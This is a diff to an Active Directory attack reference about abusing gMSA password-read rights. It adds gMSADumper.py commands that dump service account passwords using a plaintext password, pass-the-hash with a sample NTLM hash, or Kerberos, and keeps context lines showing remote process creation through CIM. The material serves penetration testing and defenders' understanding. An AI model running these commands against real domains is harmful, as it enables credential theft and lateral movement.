@@ -71,3 +71,17 @@ There are several ways to abuse the ability to read the Group Managed Service Ac
    $Command = 'whoami'
    Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$Command}
    ```
+# From kali linux we can use tool [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper/tree/main)
+Reads any gMSA password blobs the user can access and parses the values.
+```shell
+python3 gMSADumper.py -u user -p password -d domain.local
+```
+Pass the Hash, specific LDAP server:
+```shell
+python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
+```
+Kerberos Authentication, specific LDAP server:
+```shell
+python gMSADumper.py -k -d domain.local -l dc01.domain.local
+```
+
